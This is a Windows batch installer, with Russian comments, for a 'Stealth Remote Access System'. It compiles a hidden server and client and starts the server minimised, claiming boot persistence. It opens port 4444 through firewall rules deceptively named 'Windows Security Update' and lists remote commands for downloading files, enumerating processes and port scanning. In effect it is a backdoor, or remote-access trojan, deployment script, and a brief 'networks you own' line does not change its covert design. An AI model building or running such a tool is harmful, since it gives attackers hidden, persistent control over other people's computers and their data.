@echo off
setlocal enabledelayedexpansion

echo ================================================
echo    Stealth Remote Access System Installer
echo ================================================
echo.

REM Проверка прав администратора
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Running with administrator privileges
) else (
    echo [!] Warning: Not running as administrator
    echo [!] Some features may not work properly
    echo.
)

REM Проверка наличия компилятора
echo [*] Checking for g++ compiler...
g++ --version >nul 2>&1
if %errorLevel% == 0 (
    echo [+] g++ compiler found
) else (
    echo [-] g++ compiler not found
    echo [!] Please install MinGW-w64 or Visual Studio Build Tools
    echo [!] Download from: https://www.mingw-w64.org/
    pause
    exit /b 1
)

echo.
echo [*] Compiling stealth server...
g++ -std=c++11 -O2 -s -static-libgcc -static-libstdc++ stealth_server.cpp -o stealth_server.exe -lws2_32 -lshell32 -ladvapi32
if %errorLevel% == 0 (
    echo [+] Stealth server compiled successfully
) else (
    echo [-] Failed to compile stealth server
    pause
    exit /b 1
)

echo [*] Compiling remote client...
g++ -std=c++11 -O2 -s -static-libgcc -static-libstdc++ remote_client.cpp -o remote_client.exe -lws2_32
if %errorLevel% == 0 (
    echo [+] Remote client compiled successfully
) else (
    echo [-] Failed to compile remote client
    pause
    exit /b 1
)

echo [*] Compiling basic server...
g++ -std=c++11 -O2 -s -static-libgcc -static-libstdc++ server.cpp -o server.exe -lws2_32
if %errorLevel% == 0 (
    echo [+] Basic server compiled successfully
) else (
    echo [-] Failed to compile basic server
    pause
    exit /b 1
)

echo [*] Compiling basic client...
g++ -std=c++11 -O2 -s -static-libgcc -static-libstdc++ client.cpp -o client.exe -lws2_32
if %errorLevel% == 0 (
    echo [+] Basic client compiled successfully
) else (
    echo [-] Failed to compile basic client
    pause
    exit /b 1
)

echo.
echo ================================================
echo                 INSTALLATION MENU
echo ================================================
echo.
echo 1. Install stealth server (auto-start + hidden)
echo 2. Test local connection
echo 3. Configure firewall rules
echo 4. Show usage examples
echo 5. Exit
echo.
set /p choice="Select option (1-5): "

if "%choice%"=="1" goto install_stealth
if "%choice%"=="2" goto test_local
if "%choice%"=="3" goto configure_firewall
if "%choice%"=="4" goto show_usage
if "%choice%"=="5" goto end

echo Invalid choice
goto menu

:install_stealth
echo.
echo [*] Installing stealth server...
echo [!] This will:
echo     - Copy server to system directory
echo     - Add to Windows startup
echo     - Configure firewall rules
echo     - Start the service
echo.
set /p confirm="Continue? (y/n): "
if /i not "%confirm%"=="y" goto menu

echo [*] Starting stealth server installation...
start /min stealth_server.exe
echo [+] Stealth server started
echo [+] Server will auto-start on system boot
echo [+] Server is now running in stealth mode
echo.
echo [!] IMPORTANT: Server is listening on port 4444
echo [!] Connect using: remote_client.exe <target_ip> 4444
echo.
goto menu

:test_local
echo.
echo [*] Testing local connection...
echo [*] Starting basic server on port 4444...
start /min server.exe
echo [*] Waiting 3 seconds for server to start...
timeout /t 3 /nobreak >nul
echo [*] Testing connection with client...
echo.
echo [+] Starting client (type 'exit' to return to menu)
client.exe
echo.
echo [*] Test completed
goto menu

:configure_firewall
echo.
echo [*] Configuring Windows Firewall...
echo [*] Adding inbound rule for port 4444...
netsh advfirewall firewall add rule name="Windows Security Update" dir=in action=allow protocol=TCP localport=4444 >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Firewall rule added successfully
) else (
    echo [-] Failed to add firewall rule (need admin rights)
)

echo [*] Adding outbound rule for port 4444...
netsh advfirewall firewall add rule name="Windows Security Update" dir=out action=allow protocol=TCP localport=4444 >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Outbound firewall rule added successfully
) else (
    echo [-] Failed to add outbound firewall rule
)

echo.
echo [*] Current firewall status:
netsh advfirewall show allprofiles state
echo.
goto menu

:show_usage
echo.
echo ================================================
echo                 USAGE EXAMPLES
echo ================================================
echo.
echo SERVER USAGE:
echo   stealth_server.exe           - Start stealth server (auto-install)
echo   server.exe                   - Start basic server
echo   server.exe 8080              - Start server on custom port
echo.
echo CLIENT USAGE:
echo   remote_client.exe                    - Connect to localhost:4444
echo   remote_client.exe 192.168.1.100     - Connect to remote IP
echo   remote_client.exe 10.0.0.5 8080     - Connect to custom port
echo   remote_client.exe 192.168.1.100 0 scan 1 1000  - Port scan
echo.
echo REMOTE COMMANDS:
echo   cd C:\\Users                  - Change directory
echo   pwd                         - Show current directory
echo   dir                         - List files
echo   sysinfo                     - System information
echo   netstat                     - Network connections
echo   tasklist                    - Running processes
echo   download file.txt           - Download file content
echo   ipconfig                    - Network configuration
echo   whoami                      - Current user
echo.
echo NETWORK SETUP:
echo   1. Configure router port forwarding (port 4444)
echo   2. Set static IP or use DDNS
echo   3. Configure Windows Firewall
echo   4. Test connection from external network
echo.
echo SECURITY NOTES:
echo   - Change default port (4444) for better security
echo   - Use VPN for secure connections
echo   - Monitor server logs regularly
echo   - Only use on networks you own/control
echo.
echo ================================================
echo.
pause
goto menu

:menu
echo.
echo ================================================
echo                 INSTALLATION MENU
echo ================================================
echo.
echo 1. Install stealth server (auto-start + hidden)
echo 2. Test local connection
echo 3. Configure firewall rules
echo 4. Show usage examples
echo 5. Exit
echo.
set /p choice="Select option (1-5): "

if "%choice%"=="1" goto install_stealth
if "%choice%"=="2" goto test_local
if "%choice%"=="3" goto configure_firewall
if "%choice%"=="4" goto show_usage
if "%choice%"=="5" goto end

echo Invalid choice
goto menu

:end
echo.
echo [*] Installation completed
echo [*] Files created:
echo     - stealth_server.exe (hidden remote server)
echo     - remote_client.exe (advanced client)
echo     - server.exe (basic server)
echo     - client.exe (basic client)
echo.
echo [!] Remember to configure your router/firewall for remote access
echo [!] Default port: 4444
echo.
echo Thank you for using Stealth Remote Access System!
pause